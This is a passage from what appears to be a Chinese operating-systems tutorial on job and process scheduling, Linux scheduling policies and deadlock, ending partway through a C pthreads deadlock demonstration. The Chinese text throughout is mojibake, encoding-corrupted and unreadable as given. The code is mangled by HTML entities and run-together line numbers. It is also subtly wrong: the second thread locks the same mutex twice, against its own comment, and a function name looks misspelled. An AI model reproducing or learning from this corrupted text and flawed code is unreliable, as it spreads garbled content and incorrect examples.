ä¿¡æ¯å°šæœªå…¨éƒ¨è¿›å…¥ç³»ç»Ÿï¼Œæ‰€ä»¥ä¸èƒ½è¢«è°ƒåº¦ç¨‹åºé€‰ä¸­ï¼› åå¤‡çŠ¶æ€ï¼ˆæ”¶å®¹çŠ¶æ€ï¼‰ï¼šè¾“å…¥ç®¡ç†ç³»ç»Ÿä¸æ–­å°†ä½œä¸šè¾“å…¥åˆ°å¤–éƒ¨å­˜å‚¨å¯¹åº”éƒ¨åˆ†ï¼Œè‹¥ä¸€ä¸ªä½œä¸šçš„å…¨éƒ¨ä¿¡æ¯éƒ½è¾“å…¥åˆ°äº†è¾“å…¥äº•ä¸­ï¼Œåˆ™åœ¨å®ƒè¿˜æœªè¢«è°ƒåº¦æ‰§è¡Œå‰ï¼Œè¯¥ä½œä¸šå¤„äºåå¤‡çŠ¶æ€ï¼› æ‰§è¡ŒçŠ¶æ€ï¼šä½œä¸šè°ƒåº¦ç¨‹åºä»åå¤‡ä½œä¸šä¸­é€‰å–è‹¥å¹²ä¸ªä½œä¸šåˆ°å†…å­˜æŠ•å…¥è¿è¡Œï¼Œä¸ºè¢«é€‰ä¸­ä½œä¸šå»ºç«‹è¿›ç¨‹å¹¶åˆ†é…å¿…è¦çš„èµ„æºï¼Œè¿™æ—¶ï¼Œè¿™äº›è¢«é€‰ä¸­çš„ä½œä¸šå¤„äºæ‰§è¡ŒçŠ¶æ€ã€‚ä»å®è§‚ä¸Šçœ‹ï¼Œè¿™äº›ä½œä¸šè¯å¤„äºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä»å¾®è§‚ä¸Šçœ‹ï¼Œåœ¨æŸä¸€æ—¶åˆ»ï¼Œç”±äºå¤„ç†æœºæ€»æ•°å°‘äºå¹¶å‘æ‰§è¡Œçš„è¿›ç¨‹æ•°ï¼Œå› æ­¤ï¼Œä¸æ˜¯æ‰€æœ‰è¢«é€‰ä¸­ä½œä¸šéƒ½å æœ‰å¤„ç†æœºï¼Œå…¶ä¸­çš„å¤§éƒ¨åˆ†å¤„äºç­‰å¾…èµ„æºæˆ–å°±ç»ªçŠ¶æ€ã€‚å“ªä¸ªä½œä¸šçš„é‚£ä¸ªè¿›ç¨‹è¢«åˆ†é…ç»™å¤„ç†æœºï¼Œè¿™å°±æ˜¯è¿›ç¨‹è°ƒåº¦éœ€è¦å®Œæˆçš„ä»»åŠ¡ï¼› å®ŒæˆçŠ¶æ€ï¼šå½“ä½œä¸šè¿è¡Œå®Œæ¯•ï¼Œå½“å®ƒæ‰€å ç”¨çš„èµ„æºå°šæœªå…¨éƒ¨è¢«ç³»ç»Ÿæ”¶å›æ—¶ï¼Œè¯¥ä½œä¸šå¤„äºå®ŒæˆçŠ¶æ€ã€‚åœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œç³»ç»Ÿéœ€è¦åšéƒ¨åˆ†å–„åå¤„ç†å·¥ä½œã€‚ å¯¹æ¢ å¯¹æ¢åˆç§°äº¤æ¢è°ƒåº¦æˆ–ä¸­çº§è°ƒåº¦ï¼Œå…¶ä¸»è¦ä»»åŠ¡æ˜¯æŒ‰ç…§ç»™å®šçš„åŸåˆ™å’Œç­–ç•¥ï¼Œå°†å¤„äºå¤–éƒ¨å­˜å‚¨äº¤æ¢åŒºä¸­çš„å°±ç»ªçŠ¶æ€æˆ–ç­‰å¾…çŠ¶æ€çš„è¿›ç¨‹è°ƒå…¥å†…å­˜ï¼Œæˆ–æŠŠå¤„äºå†…å­˜å°±ç»ªçŠ¶æ€æˆ–å†…å­˜ç­‰å¾…çŠ¶æ€çš„è¿›ç¨‹äº¤æ¢åˆ°å¤–éƒ¨å­˜å‚¨äº¤æ¢åŒºã€‚äº¤æ¢è°ƒåº¦ä¸»è¦æ¶‰åŠå†…å­˜ç®¡ç†ä¸æ‰©å……ã€‚ï¼ˆè¿™éƒ¨åˆ†å°†åœ¨åé¢çš„å†…å­˜ç®¡ç†ä¸­è¯¦ç»†è®²åˆ°ï¼‰ è¿›ç¨‹è°ƒåº¦ è¿›ç¨‹è°ƒåº¦åˆç§°ä¸ºä½çº§è°ƒåº¦æˆ–å¾®è§‚è°ƒåº¦ï¼Œå…¶ä¸»è¦ä»»åŠ¡æ˜¯æŒ‰ç…§æŸç§ç­–ç•¥å’Œç®—æ³•ï¼Œå°†å¤„ç†æœºåˆ†é…ç»™ä¸€ä¸ªå¤„äºå°±ç»ªçŠ¶æ€çš„è¿›ç¨‹ã€‚åœ¨ç¡®å®šäº†å ç”¨å¤„ç†æœºçš„è¿›ç¨‹åï¼Œç³»ç»Ÿå¿…é¡»è¿›è¡Œè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ä»¥å»ºç«‹ä¸å ç”¨å¤„ç†æœºè¿›ç¨‹ç›¸é€‚åº”çš„æ‰§è¡Œç¯å¢ƒã€‚è¿›ç¨‹è°ƒåº¦å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š éæŠ¢å æ–¹å¼ã€‚éæŠ¢å æ–¹å¼ä¸å…è®¸è¿›ç¨‹æŠ¢å å·²ç»åˆ†é…å‡ºå»çš„å¤„ç†æœºã€‚é‡‡ç”¨éæŠ¢å è°ƒåº¦æ–¹å¼æ—¶ï¼Œå¯èƒ½å¼•èµ·è¿›ç¨‹è°ƒåº¦çš„åŸå› æœ‰æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹æ‰§è¡Œå®Œæˆã€å› å‘ç”ŸæŸäº‹ä»¶è€Œä¸èƒ½æœºä¿®æ‰§è¡Œã€æ‰§è¡Œä¸­çš„è¿›ç¨‹å› æå‡º I/O è¯·æ±‚è€Œæš‚åœæ‰§è¡Œã€åœ¨è¿›ç¨‹é€šä¿¡æˆ–åŒæ­¥è¿‡ç¨‹ä¸­æ‰§è¡Œäº†æŸç§åŸè¯­æ“ä½œç­‰ç­‰ã€‚éæŠ¢å è°ƒåº¦æ–¹å¼çš„ä¼˜ç‚¹æ˜¯å®ç°ç®€å•ã€ç³»ç»Ÿå¼€é”€å°ï¼Œé€‚ç”¨äºå¤§éƒ¨åˆ†çš„æ‰¹å¤„ç†ç³»ç»Ÿç¯å¢ƒï¼Œä½†æ˜¯å¾ˆéš¾æ»¡è¶³ç´§æ€¥ä»»åŠ¡çš„è¦æ±‚ã€‚ æŠ¢å æ–¹å¼ã€‚æŠ¢å è°ƒåº¦æ–¹å¼å…è®¸è°ƒåº¦ç¨‹åºæ ¹æ®æŸç§åŸåˆ™æš‚åœæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ï¼Œå°†å¤„ç†æœºæ”¶å›ï¼Œé‡æ–°åˆ†é…ç»™å¦ä¸€ä¸ªè¿›ç¨‹ã€‚æŠ¢å çš„åŸåˆ™æœ‰ä¼˜å…ˆçº§åŸåˆ™ã€çŸ­ä½œä¸šä¼˜å…ˆåŸåˆ™ã€æ—¶é—´ç‰‡åŸåˆ™ç­‰ã€‚ ä½œä¸šè°ƒåº¦å’Œè¿›ç¨‹è°ƒåº¦å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x03 è°ƒåº¦ç®—æ³• åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œè°ƒåº¦çš„å®è´¨æ˜¯ä¸€ç§èµ„æºåˆ†é…ï¼Œå› è€Œè°ƒåº¦ç®—æ³•æ˜¯æ ¹æ®ç³»ç»Ÿçš„èµ„æºåˆ†é…ç­–ç•¥ï¼Œè§„å®šèµ„æºåˆ†é…çš„ç®—æ³•ã€‚ç°æœ‰çš„å„ç§è°ƒåº¦ç®—æ³•ä¸­ï¼Œæœ‰çš„é€‚ç”¨äºä½œä¸šè°ƒåº¦ï¼Œæœ‰çš„åˆ™é€‚ç”¨äºè¿›ç¨‹è°ƒåº¦ï¼Œä¹Ÿæœ‰ä¸€äº›ä¸¤è€…éƒ½é€‚ç”¨çš„ç®—æ³•ã€‚ å¯¹äºä¸åŒçš„ç³»ç»Ÿå’Œè°ƒåº¦ç›®æ ‡ï¼Œåº”é‡‡ç”¨ä¸åŒçš„è°ƒåº¦ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œåœ¨æ‰¹å¤„ç†ç³»ç»Ÿä¸­ï¼Œè€ƒè™‘ä½œä¸šçš„å¹³å‡å‘¨è½¬æ—¶é—´ï¼Œåº”é‡‡ç”¨çŸ­ä½œä¸šä¼˜å…ˆçš„è°ƒåº¦ç®—æ³•ï¼›åœ¨åˆ†æ—¶ç³»ç»Ÿä¸­ï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿå…·æœ‰åˆç†çš„å“åº”æ—¶é—´ï¼Œåº”é‡‡ç”¨è½®è½¬æ³•è¿›è¡Œè°ƒåº¦ã€‚ä¸‹é¢å°±ç®€å•äº†è§£ä¸€ä¸‹ç›®å‰ä¸»æµçš„å‡ ç§è°ƒåº¦ç®—æ³•ã€‚ 0x04 å•é“æ‰¹å¤„ç†ç³»ç»Ÿçš„è°ƒåº¦ç®—æ³• å•é“æ‰¹å¤„ç†ç³»ç»Ÿä¸­ï¼Œä½œä¸šè°ƒåº¦çš„ä¸»è¦ä»»åŠ¡æ˜¯è§£å†³ä½œä¸šä¹‹é—´çš„è‡ªåŠ¨æ¥ç»­é—®é¢˜ï¼Œå‡å°‘æ“ä½œå‘˜çš„å¹²é¢„ï¼Œæé«˜ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨ç‡ï¼Œæ‰€é‡‡ç”¨çš„è°ƒåº¦ç®—æ³•æ¯”è¾ƒç®€å•ï¼Œæœ‰å¦‚ä¸‹å‡ ç§ï¼š å…ˆæ¥å…ˆæœåŠ¡è°ƒåº¦ç®—æ³•ï¼šæŒ‰ç…§ä½œä¸šæˆ–è¿›ç¨‹åˆ°è¾¾çš„å‰åæŒç»­è¿›è¡Œè°ƒåº¦ çŸ­ä½œä¸šï¼ˆè¿›ç¨‹ï¼‰ä¼˜å…ˆè°ƒåº¦ç®—æ³•ï¼šå¯¹çŸ­ä½œä¸šæˆ–çŸ­è¿›ç¨‹ä¼˜å…ˆè°ƒåº¦çš„ç®—æ³• 0x05 å¤šé“æ‰¹å¤„ç†ç³»ç»Ÿçš„è°ƒåº¦ç®—æ³• åœ¨å¤šé“ç¨‹åºè®¾è®¡ç³»ç»Ÿä¸­ï¼Œç”±äºè°‹é“ä½œä¸šçš„è¾“å…¥è¾“å‡ºæ“ä½œç”±é€šé“ä»£è¡Œæ§åˆ¶ï¼Œå°† CPU ä»ç¹å¤šçš„ I/O æ“ä½œä¸­è§£è„±å‡ºæ¥ï¼Œå› æ­¤ CPU å¯å†åˆ†é…ç»™å¦ä¸€é“ä½œä¸šï¼Œä»è€Œå½¢æˆäº†å¤šé“ä½œä¸šå¹¶å‘æ‰§è¡Œçš„ç»“æœï¼Œå‡å°‘äº† CPU å¯¹ I/O çš„ç­‰å¾…æ—¶é—´ã€‚ä½†æ˜¯ï¼Œç”±äºä½œä¸šä¸åŒï¼Œå„ä½œä¸šæ‰§è¡Œæ—¶åŒ…å«çš„ I/O æ“ä½œæ—¶é—´çš„æ¯”ä¾‹ä¸åŒã€‚åŸºäºè¿™äº›åŸå› ï¼Œå¤§å¤šæ•°å¤šé“ç¨‹åºç³»ç»Ÿçš„è°ƒåº¦ç­–ç•¥é‡‡ç”¨ï¼šå…ˆæ¥å…ˆæœåŠ¡ã€è€ƒè™‘ä¼˜å…ˆçº§ã€åˆ†æ—¶å’Œä¼˜å…ˆçº§ç›¸ç»“åˆã€ç»¼åˆè€ƒè™‘èµ„æºè¦æ±‚ç­‰ã€‚ å…ˆæ¥å…ˆæœåŠ¡è°ƒåº¦ï¼šæŒ‰ç…§ä½œä¸šæˆ–è¿›ç¨‹è¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„å‰åé¡ºåºè¿›è¡Œè°ƒåº¦æ‰§è¡Œï¼› åŸºäºä¼˜å…ˆçº§è°ƒåº¦ï¼šæ¯ä¸€é“ä½œä¸šæˆ–è€…è¿›ç¨‹éƒ½è®¾å®šäº†ä¸€å®šçš„ä¼˜å…ˆçº§åˆ«ï¼Œä¼˜å…ˆçº§åˆ«å¯ä»¥ç”±ç”¨æˆ·å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ç”±ç³»ç»Ÿè®¾å®šæˆ–è®¡ç®—ç¡®å®šã€‚è°ƒåº¦æ—¶æŒ‘é€‰ä¼˜å…ˆçº§é«˜è€…ï¼Œä¼˜å…ˆçº§ç›¸åŒæ—¶ï¼ŒæŒ‰è¿›ç¨‹è¿›å…¥å°±ç»ªæ€é˜Ÿåˆ—æˆ–ä½œä¸šè¿›å…¥åå¤‡æ€é˜Ÿåˆ—çš„å…ˆåé¡ºåºï¼› åˆ†æ—¶å’Œä¼˜å…ˆçº§ç›¸ç»“åˆè°ƒåº¦ï¼šé€‚ç”¨äºåˆ†æ—¶æ“ä½œç³»ç»Ÿä¸­æˆ–è€…é€šç”¨æ“ä½œç³»ç»Ÿï¼› ç»¼åˆè€ƒè™‘èµ„æºè¦æ±‚è°ƒåº¦ï¼šç»¼åˆè€ƒè™‘æ¯ä¸€é“ä½œä¸šæˆ–è¿›ç¨‹å¯¹èµ„æºçš„è¦æ±‚è¿›è¡Œè°ƒåº¦åˆ†é…ï¼› 0x06 Linux ç³»ç»Ÿçš„è°ƒåº¦ç®—æ³• å‰é¢è®²äº†åŸºæœ¬ä¸Šæ‰€æœ‰çš„è°ƒåº¦ç®—æ³•åŠå…¶ä¼˜ç¼ºç‚¹ï¼Œé‚£ä¹ˆåœ¨ Linux æ“ä½œç³»ç»Ÿä¸‹æ˜¯ä»€ä¹ˆæ ·çš„æƒ…å†µå‘¢ã€‚Linux ç³»ç»Ÿä½œä¸šè°ƒåº¦éå¸¸ç®€å•ï¼Œæˆ–è€…è¯´æ²¡æœ‰ä½œä¸šè°ƒåº¦ï¼Œä½œä¸šä¸€æ—¦æäº¤å°±ç›´æ¥è¿›å…¥å†…å­˜ï¼Œå»ºç«‹å¯¹åº”çš„è¿›ç¨‹ï¼Œç»§è€Œè¿›å…¥ä¸‹ä¸€çº§çš„è°ƒåº¦ã€‚äº¤æ¢è°ƒåº¦ä¸»è¦æ¶‰åŠç³»ç»Ÿå­˜å‚¨ç®¡ç†çš„å†…å®¹ï¼ˆè¿™éƒ¨åˆ†åœ¨åé¢çš„å†…å­˜ç®¡ç†ä¸­è®²è¿°ï¼‰ã€‚ Linux æ“ä½œç³»ç»Ÿä¸­çš„å†…æ ¸çº§çº¿ç¨‹å’Œè¿›ç¨‹åœ¨è¡¨ç¤ºã€ç®¡ç†è°ƒåº¦æ–¹é¢æ²¡æœ‰å·®åˆ«ï¼Œç³»ç»Ÿä¹Ÿæ²¡ç”¨ä¸“é—¨çš„çº¿ç¨‹è°ƒåº¦ï¼Œé‡‡ç”¨è¿›ç¨‹è°ƒåº¦ç»Ÿä¸€å¤„ç†è¿›ç¨‹å’Œå†…æ ¸çº¿ç¨‹ã€‚ Linux ç³»ç»Ÿçš„è¿›ç¨‹è°ƒåº¦ç­–ç•¥ Linux ç³»ç»Ÿçš„è°ƒåº¦ç¨‹åºå°±æ˜¯å†…æ ¸ä¸­çš„ schedule() å‡½æ•°ï¼Œä¸»è¦ä»»åŠ¡å°±æ˜¯åœ¨å°±ç»ªé˜Ÿåˆ— run_queue ä¸­é€‰å‡ºä¸€ä¸ªè¿›ç¨‹å¹¶æŠ•å…¥è¿è¡Œã€‚schedule() å‡½æ•°éœ€è¦ç¡®å®šä»¥ä¸‹éƒ¨åˆ†å‚æ•°ï¼š è¿›ç¨‹è°ƒè¯•ç®—æ³• policy è¿›ç¨‹è¿‡ç¨‹å‰©ä½™æ—¶é—´ç‰‡ counter è¿›ç¨‹é™æ€ä¼˜å…ˆçº§ priority å®æ—¶è¿›ç¨‹ä¼˜å…ˆçº§ rt_priority ç”¨æˆ·å¯æ§åˆ¶ nice å› å­ ä¸Šé¢å‚æ•°è¢«å­˜æ”¾åœ¨è¿›ç¨‹æ§åˆ¶å—ä¸­ç›¸åº”çš„è°ƒåº¦æˆå‘˜ä¸­ï¼ŒLinux ç³»ç»Ÿæä¾›äº†ä¸‰ç§è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼Œè¿™ä¸‰ç§ç®—æ³•å¯ä»¥ç”±ç”¨æˆ·é€šè¿‡å®å®šä¹‰é€‰æ‹©ï¼Œå…·ä½“å¯ç”¨è°ƒåº¦ç­–ç•¥å¦‚ä¸‹ï¼š è°ƒåº¦ç­–ç•¥æ ‡å¿— æ‰€ä»£è¡¨çš„è°ƒåº¦ç­–ç•¥ #define SCHED_OTHER æ™®é€šçš„åˆ†æ—¶è¿›ç¨‹ #define SCHED_FIFO å…ˆè¿›å…ˆå‡ºçš„å®æ—¶è¿›ç¨‹ #define SCHED_RR åŸºäºä¼˜å…ˆçº§çš„è½®è½¬ç®—æ³• #define SCHED_YIELD ä¸æ˜¯è°ƒåº¦ç­–ç•¥ï¼Œè¡¨ç¤ºè¿›ç¨‹è®©å‡º CPU Linux å†…æ ¸å°†è¿›ç¨‹åˆ†ä¸ºå®æ—¶è¿›ç¨‹å’Œéå®æ—¶è¿›ç¨‹ï¼ˆæ™®é€šè¿›ç¨‹ï¼‰ä¸¤ç§ï¼Œå®æ—¶è¿›ç¨‹è·å¾— CPU æ¯”æ™®é€šè¿›ç¨‹ä¼˜å…ˆï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ sched_setschedule() å‡½æ•°æ”¹å˜è‡ªå·±çš„è°ƒåº¦ç­–ç•¥ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ sys_setpriority() å’Œ sys_nice() æ”¹å˜å…¶é™æ€ä¼˜å…ˆçº§ã€‚ 0x07 æ­»é”é—®é¢˜ è®¡ç®—æœºç³»ç»Ÿä¸­æœ‰å¾ˆå¤šèµ„æºå±äºå•ç‹¬çš„èµ„æºï¼Œä½†æ˜¯åœ¨å¾ˆå¤šè¿›ç¨‹ä¸­éƒ½è¦å…±äº«è¿™ç±»èµ„æºï¼Œè¿™æ ·ï¼Œè‹¥å¹²è¿›ç¨‹å°±ä¼šç›¸äº’ç«äº‰æœ‰é™çš„èµ„æºï¼Œå› è·å–ä¸åˆ°èµ„æºè€Œé™·å…¥é˜»å¡çŠ¶æ€ã€‚ ç³»ç»Ÿå‘é€æ­»é”ç°è±¡ä¸ä»…æµªè´¹å¤§é‡çš„ç³»ç»Ÿèµ„æºï¼Œç”šè‡³å¯¼è‡´æ•´ä¸ªç³»ç»Ÿå¥”æºƒï¼Œå¸¦æ¥ä¸¥é‡çš„åæœã€‚æ‰€ä»¥ï¼Œå¯¹æ­»é”é—®é¢˜å†ç†è®ºä¸Šå’ŒæŠ€æœ¯ä¸Šéƒ½å¿…é¡»ç»™äºˆé«˜åº¦é‡è§†ï¼Œé‡‡å–ä¸€äº›æœ‰æ•ˆçš„æªæ–½æ¥é¢„é˜²ã€é¿å…æ­»é”çš„å‘ç”Ÿã€‚ 0x08 æ­»é”çš„æ¦‚å¿µ æ­»é”æ˜¯è¿›ç¨‹æ­»é”çš„ç®€ç§°ï¼Œæ˜¯ç”± Dijkstra äº 1965 å¹´ç ”ç©¶é“¶è¡Œå®¶ç®—æ³•æ—¶æå‡ºçš„ï¼Œä¹Ÿæ˜¯è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¹ƒè‡³å¹¶å‘ç¨‹åºè®¾è®¡ä¸­éå¸¸é‡è¦ä½†åˆæœ€éš¾å¤„ç†çš„é—®é¢˜ä¹‹ä¸€ã€‚æŒæ¡æ“ä½œç³»ç»Ÿä¸­å¯¹äºæ­»é”çš„å¤„ç†æ–¹æ³•ï¼Œå¯¹è®¡ç®—æœºä¸­å¤„ç†å¹¶å‘ç¨‹åºçš„ç«äº‰é—®é¢˜æœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒP1 è¿›ç¨‹å æ®èµ„æº R1ï¼ŒP2 è¿›ç¨‹å æ®èµ„æº R2ï¼Œå½“ P1 è¿›ç¨‹æœŸæœ›å¾—åˆ°èµ„æº R2ï¼Œè€Œ P2 è¿›ç¨‹ä¹ŸæœŸæœ›è®¿é—®èµ„æº R1 æ—¶å½¼æ­¤éƒ½ä¸èƒ½ç»§ç»­æ‰§è¡Œä»è€Œé™·å…¥æ­»é”ã€‚ ç®€å•æ¥è¯´ï¼Œæ­»é”å°±æ˜¯æŒ‡å¤šä¸ªè¿›ç¨‹åœ¨å¾ªç¯ç­‰å¾…å…¶ä»–è¿›ç¨‹å æœ‰çš„èµ„æºï¼Œå› ä¸ºå§‹ç»ˆç­‰å¾…ä¸åˆ°å…¶ä»–è¿›ç¨‹é‡Šæ”¾èµ„æºä»è€Œè¿›å…¥æ— é™æœŸç­‰å¾…çŠ¶æ€ï¼›ä¹Ÿå¯ä»¥è¯´æ­»é”æ˜¯è¿›ç¨‹ä¹‹é—´æ— é™æœŸäº’ç›¸ç­‰å¾…çš„äº‹ä»¶ã€‚ å…¶å®ï¼Œåœ¨å‰é¢çš„éƒ¨åˆ†æ“ä½œå®éªŒä¸­ï¼Œæˆ‘ä»¬å·²ç»è§£å†³è¿‡æ­»é”é—®é¢˜ã€‚æ¯”å¦‚ä¹‹å‰çš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…é—®é¢˜ä¸­ï¼Œè¦æ§åˆ¶ä¸¤ä¸ªä¸ªè¿›ç¨‹ä¹‹é—´æ‰§è¡Œçš„é¡ºåºå°±æ˜¯ä¸ºäº†é¿å…æ­»é”çš„å‘ç”Ÿã€‚ 0x09 æ­»é”äº§ç”Ÿçš„åŸå› åŠå¿…è¦æ¡ä»¶ ä»å‰é¢çš„ä»‹ç»ä¸­å¯ä»¥å°†ç³»ç»Ÿäº§ç”Ÿæ­»é”çš„æ ¹æœ¬åŸå› å½’ç»“ä¸ºä»¥ä¸‹å‡ ç‚¹ï¼š ä¸ªè¿›ç¨‹ç«äº‰ä¼˜å…ˆçš„èµ„æº è¿›ç¨‹æ¨è¿›é¡ºåºä¸å½“ è€Œæ­»é”äº§ç”Ÿçš„å¿…ç„¶æ¡ä»¶ï¼Œæ¢å¥è¯è¯´ï¼Œå½“ç³»ç»Ÿå¦‚æœå¯èƒ½å‘ç”Ÿæ­»é”åˆ™ä¸€å®šå­˜åœ¨å¦‚ä¸‹æƒ…å†µæˆ–è€…æ¡ä»¶ï¼š äº’æ–¥æ¡ä»¶ï¼šå¯¹äºä¸€ä¸ªæ’ä»–æ€§èµ„æºï¼ŒåŒä¸€æ—¶åˆ»åªèƒ½ç”±æœ€å¤šä¸€ä¸ªè¿›ç¨‹å æœ‰ï¼› å æœ‰ä¸”ç”³è¯·æ¡ä»¶ï¼šè¿›ç¨‹è‡³å°‘å æœ‰ä¸€ä¸ªèµ„æºï¼Œä½†æ˜¯åˆç”³è¯·æ–°çš„èµ„æºï¼Œç­‰å¾…æ–°èµ„æºçš„æ—¶å€™ä»ç„¶æ²¡æœ‰é‡Šæ”¾å·²å ç”¨èµ„æºï¼› ä¸å¯æŠ¢å æ¡ä»¶ï¼šè¿›ç¨‹æ‰€è·å¾—çš„èµ„æºåœ¨æœªä½¿ç”¨å®Œæ¯•å‰ä¸èƒ½å¼ºè¡Œè¢«å…¶ä»–è¿›ç¨‹å¤ºå–ï¼› ç¯è·¯æ¡ä»¶ï¼šå­˜åœ¨ä¸€ä¸ªè¿›ç¨‹ç­‰å¾…åºåˆ— 0x0a è§£å†³æ­»é”çš„åŸºæœ¬æ–¹æ³• ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œï¼Œåº”äº‹å…ˆé‡‡å–æªæ–½ï¼Œé¢„é˜²æˆ–é¿å…æ­»é”çš„å‘ç”Ÿã€‚åœ¨ç³»ç»Ÿå·²å‡ºç°æ­»é”åï¼Œè¦åŠæ—¶æ£€æµ‹åˆ°æ­»é”å¹¶è§£é™¤æ­»é”ã€‚ç›®å‰ç”¨äºå¤„ç†æ­»é”é—®é¢˜çš„æ–¹æ³•å¦‚ä¸‹ï¼š æ­»é”çš„é¢„é˜²ï¼šé‡‡å–æŸç§ç­–ç•¥ï¼Œé™åˆ¶å¹¶å‘è¿›ç¨‹å¯¹èµ„æºçš„è¯·æ±‚ï¼Œä»è€Œä¿è¯æ­»é”çš„å¿…è¦æ¡ä»¶åœ¨ç³»ç»Ÿæ‰§è¡Œçš„ä»»ä½•æ—¶é—´éƒ½å¾—ä¸åˆ°æ»¡è¶³ï¼› æ­»é”çš„é¿å…ï¼šåœ¨åˆ†é…èµ„æºæ—¶ï¼Œæ ¹æ®èµ„æºçš„ä½¿ç”¨æƒ…å†µæå‰åšå‡ºé¢„æµ‹ï¼Œç»™å®šä¸€ä¸ªåˆé€‚ã€å®‰å…¨çš„è¿›ç¨‹æ¨è¿›é¡ºåºï¼Œä»è€Œé¿å…æ­»é”çš„å‘ç”Ÿï¼› æ­»é”çš„æ£€æµ‹ï¼šå…è®¸ç³»ç»Ÿå‘ç”Ÿæ­»é”ã€‚ç³»ç»Ÿè®¾ç½®ä¸“ç”¨ç»“æ„åº”å¯¹æ­»é”çš„å‘ç”Ÿã€‚å½“æ­»é”å‘ç”Ÿæ—¶ï¼Œèƒ½å¤Ÿæ£€æµ‹åˆ°æ­»é”å¹¶æ‰¾å‡ºå¯¹åº”çš„è¿›ç¨‹å’Œèµ„æºï¼› æ­»é”çš„è§£é™¤ï¼šä¸æ­»é”æ£€æµ‹é…å¥—æªæ–½ï¼Œç”¨äºå°†è¿›ç¨‹ä»æ­»é”çŠ¶æ€è§£æ•‘å‡ºæ¥ã€‚ 0x0b äº§ç”Ÿæ­»é”å®ä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/time.h&gt;#include &lt;string.h&gt;#define MAX 10pthread_t thread[2]; //ä¸¤ä¸ªçº¿ç¨‹/* å®šä¹‰ä¸¤ä¸ªé”ï¼Œç»™ä¸¤ä¸ªçº¿ç¨‹åˆ†åˆ«ä½¿ç”¨ */pthread_mutex_t mutex_0;pthread_mutex_t mutex_1;int number=0;int i;void *thread1()&#123; /* é¦–å…ˆå°†è‡ªå·±çš„çº¿ç¨‹é” 1 ä¸Šé”ï¼Œç„¶åè®¿é—®å…±äº«æ•°æ® number ï¼Œå¯¹å…¶è¿›è¡Œ + 1 æ“ä½œï¼Œæ¥ç€ä¸é‡Šæ”¾çº¿ç¨‹é”1 è€Œæ˜¯å°è¯•å»è·å– çº¿ç¨‹é” 2 */ printf (&quot;thread[1] : I&#x27;m thread 1\\n&quot;); pthread_mutex_lock(&amp;mutex_0); printf(&quot;thread[1]: mutex_0 already lock!\\n&quot;); number++; printf(&quot;thread[1]: number++--&gt;[%d]\\n&quot;, number); printf(&quot;thread[1]: I will deadlock....\\n&quot;); pthread_mutex_lock(&amp;mutex_1); /* ä¼šåœ¨ä¸Šä¸€æ­¥æ­»é”ï¼Œçº¿ç¨‹æ­»ç­‰åœ¨æ­¤å¤„ */ printf(&quot;thread1 :ä¸»å‡½æ•°åœ¨ç­‰æˆ‘å®Œæˆä»»åŠ¡å—ï¼Ÿ\\n&quot;); pthread_exit(NULL);&#125;void *thread2()&#123; /* é¦–å…ˆå°†è‡ªå·±çš„çº¿ç¨‹é” 2 ä¸Šé”ï¼Œç¡®ä¿çº¿ç¨‹1 åœ¨è·å–çº¿ç¨‹é” 2 æ—¶æ— é™ç­‰å¾…ï¼ˆæ­»é”ï¼‰ï¼Œç„¶åå°è¯•å»è·å–çº¿ç¨‹é” 1ï¼ˆä¹Ÿè¢«çº¿ç¨‹ 1 ä¸Šé”ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šæ— é™ç­‰å¾…ã€‚*/ printf (&quot;thread[2] : I&#x27;m thread 2\\n&quot;); /* ç¡®ä¿çº¿ç¨‹1 å…ˆå°†é” 1 ä¸Šé” */ sleep(1); pthread_mutex_lock(&amp;mutex_1); printf(&quot;thread[2]: mutex_1 already lock!\\n&quot;); number++; printf(&quot;thread[2]: number++--&gt;[%d]\\n&quot;, number); printf(&quot;thread[2]: I will deadlock....\\n&quot;); pthread_mutex_lock(&amp;mutex_1); /* ä¼šåœ¨ä¸Šä¸€æ­¥æ­»é”ï¼Œçº¿ç¨‹æ­»ç­‰åœ¨æ­¤å¤„ */ printf(&quot;thread2 :ä¸»å‡½æ•°åœ¨ç­‰æˆ‘å®Œæˆä»»åŠ¡å—ï¼Ÿ\\n&quot;); pthread_exit(NULL);&#125;void thread_create(void) //åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹&#123; int temp; memset(&amp;thread, 0, sizeof(thread)); //comment1 /*åˆ›å»ºçº¿ç¨‹*/ if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0) //comment2 &#123; printf(&quot;pthread 1 åˆ›å»ºå¤±è´¥!\\n&quot;); &#125; else &#123; printf(&quot;pthread 1 è¢«åˆ›å»º\\n&quot;); &#125; if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0) //comment3 &#123; printf(&quot;pthread 2 åˆ›å»ºå¤±è´¥\\n&quot;); &#125; else &#123; printf(&quot;pthread 2 è¢«åˆ›å»º\\n&quot;); &#125;&#125;void thread_wait(void)&#123; /*ç­‰å¾…çº¿ç¨‹ç»“æŸ*/ if(thread[0] !=0) &#123; pthread_join(thread[0],NULL); 